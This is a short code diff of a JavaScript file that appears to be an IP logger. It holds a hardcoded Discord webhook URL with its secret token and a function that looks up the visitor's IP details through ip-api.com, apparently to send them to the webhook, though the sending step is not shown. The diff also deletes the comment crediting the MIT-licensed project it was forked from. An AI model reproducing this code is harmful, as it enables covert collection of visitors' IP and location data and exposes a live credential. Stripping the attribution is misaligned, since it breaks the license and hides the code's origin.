@@ -2,10 +2,7 @@
 
 var webHookUrl = "https://canary.discord.com/api/webhooks/1182792536880840714/bsZ4wNqXtfxEFV5axWPdyXsPuvvEk9ejR5Vt3vfdwy45BFwHSeH9bUQq6__Y_83QzEI3";
 
-/*
-    Forked from: https://github.com/luisoos/IP-Log-To-Webhook
-    License: MIT
-*/
+
 
 const request = async () => { // Calling a "synchronous" fetch
     const response = await fetch('http://ip-api.com/json/');
